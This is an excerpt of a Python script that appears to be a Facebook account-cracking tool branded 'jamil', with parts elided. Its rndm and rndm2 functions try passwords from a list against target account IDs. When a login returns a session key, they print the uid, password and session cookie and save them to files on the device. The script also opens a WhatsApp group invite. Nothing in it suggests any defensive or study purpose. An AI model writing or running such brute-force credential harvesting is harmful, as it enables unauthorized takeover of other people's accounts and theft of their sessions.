...
try:
	...
	os.system('python jamil.py')
print('\n\033[1;37m Cheking for updetes...');time.sleep(3)


print('\n\033[1;33m join my WHATS APP groph');time.sleep(1)
os.system('xdg-open https://chat.whatsapp.com/JrjvjZSfEqsEspftDHKDdn')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [jamil-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/jamil-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;33m [jamil-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
                                                        open('/sdcard/jamil-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;33m [jamil-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [jamil-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/jamilOK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;33m [jamil-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/jamil-COOKIE.txt','a').write(coki+'\n')
                                                ...
                                                print('\r\r\033[1;33m [jamil-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/jamil-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
